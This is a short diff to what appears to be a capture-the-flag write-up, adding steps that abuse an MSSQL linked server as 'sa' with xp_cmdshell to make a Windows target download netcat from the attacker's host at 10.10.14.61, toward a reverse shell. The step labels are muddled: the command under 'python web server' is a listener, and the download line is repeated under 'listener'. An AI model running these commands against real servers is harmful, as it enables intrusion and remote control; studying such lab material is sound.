@@ -1107,4 +1107,14 @@ I cannot send a powershell reverse shell, i think its because the payload is too
 EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -c wget http://10.10.14.61/nc64.exe -o C:\programdata\nc64.exe'';') AT [PRIMARY];
 ```
 
-Ill transfer ne
+Ill transfer netcat to the target, using a python web server
+
+```python
+penelope -p 1337
+```
+
+Then set a listener
+
+```python
+EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -c wget http://10.10.14.61/nc64.exe -o C:\programdata\nc64.exe'';') AT [PRIMARY];
+```
